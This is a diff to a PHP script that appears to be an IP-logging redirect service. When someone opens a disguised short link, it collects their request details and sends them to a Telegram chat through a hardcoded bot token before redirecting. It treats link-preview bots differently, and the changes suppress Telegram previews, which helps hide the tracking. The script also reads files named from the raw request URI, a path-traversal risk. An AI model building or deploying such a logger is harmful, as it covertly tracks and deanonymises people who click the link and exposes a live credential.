@@ -9,7 +9,7 @@ define('TOKEN', '615799996:AAHE-PXAcmLClqHUbnYmWqYByUj8MyEba5A', true);
 
 if (substr($_SERVER['REQUEST_URI'], 0, 2) == "/r")
 {	
-	$filename = trim($_SERVER['REQUEST_URI'], "/");
+	$filename = trim( explode('?', $_SERVER['REQUEST_URI'], 2)[0], "/");
 	$redirectid = trim(trim(file("./redirect/" . $filename . ".txt")[0]), '"');
 	if ($_SERVER ['HTTP_USER_AGENT'] == 'TelegramBot (like TwitterBot)' || $_SERVER ['HTTP_USER_AGENT'] == 'bitlybot/3.0 (+http://bit.ly/)' || $_SERVER ['HTTP_USER_AGENT'] == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) QtWebEngine/5.6.0 Chrome/45.0.2454.101 Safari/537.36 Viber") 
 	{
@@ -33,7 +33,7 @@ if (substr($_SERVER['REQUEST_URI'], 0, 2) == "/r")
 		$data = $data . "*Language:*\n\t" . $_SERVER["HTTP_ACCEPT_LANGUAGE"] . "\n";
 		$chatid = trim(file("./redirect/" . $filename . ".txt")[1]);
 		$mess = $data;
-		$tbot = file_get_contents("https://api.telegram.org/bot".token."/sendMessage?chat_id=".$chatid."&text=".urlencode($mess) . "&parse_mode=Markdown");	
+		$tbot = file_get_contents("https://api.telegram.org/bot".token."/sendMessage?chat_id=".$chatid."&text=".urlencode($mess) . "&parse_mode=Markdown" . "&disable_web_page_preview=true");	
 		header("Location: " . $redirectid);
 	}
 	exit();
@@ -109,7 +109,7 @@ if (count($_POST) > 0) {
 	if ($_POST['chatid'] != "none") {
 		$chatid = $_POST['chatid'];
 		$mess = $data;
-		$tbot = file_get_contents("https://api.telegram.org/bot".token."/sendMessage?chat_id=".$chatid."&text=".urlencode($mess) . "&parse_mode=Markdown");	
+		$tbot = file_get_contents("https://api.telegram.org/bot".token."/sendMessage?chat_id=".$chatid."&text=".urlencode($mess) . "&parse_mode=Markdown" . "&disable_web_page_preview=true");	
 	}
 	exit();
 }
@@ -137,8 +137,8 @@ if (isset($_GET["redirect"])) {
 	</iframe>-->
 	<script>
 	var redirect <?php
-		if (file_exists('./redirect/' . trim($_SERVER['REQUEST_URI'], "/") . '.txt')){
-			$filename = trim($_SERVER['REQUEST_URI'], "/");
+		if (file_exists('./redirect/' . trim(explode('?', $_SERVER['REQUEST_URI'], 2)[0], "/") . '.txt')){
+			$filename = trim(explode('?', $_SERVER['REQUEST_URI'], 2)[0], "/");
 			$redirectid = trim(file("./redirect/" . $filename . ".txt")[0]);
 			echo '= ' . $redirectid . ";\n    var reqUri = \"" . $filename . "\";";
 		}
@@ -148,8 +148,8 @@ if (isset($_GET["redirect"])) {
 		}
 	?>
 	var chatid <?php
-		if (file_exists('./redirect/' . trim($_SERVER['REQUEST_URI'], "/") . '.txt')){
-			echo "=" . htmlspecialchars(trim(file("./redirect/" . trim($_SERVER['REQUEST_URI'], "/") . ".txt")[1]));
+		if (file_exists('./redirect/' . trim(explode('?', $_SERVER['REQUEST_URI'], 2)[0], "/") . '.txt')){
+			echo "=" . htmlspecialchars(trim(file("./redirect/" . trim(explode('?', $_SERVER['REQUEST_URI'], 2)[0], "/") . ".txt")[1]));
 			fclose($file);
 		}
 		else {
